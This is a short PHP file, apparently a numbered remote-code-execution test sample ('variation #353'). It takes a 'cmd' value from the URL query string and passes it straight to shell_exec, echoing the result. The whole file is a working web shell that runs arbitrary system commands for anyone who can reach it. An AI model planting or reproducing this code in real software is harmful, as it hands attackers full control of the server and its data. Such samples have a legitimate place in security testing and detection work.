<?php
// RCE test variation #353
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>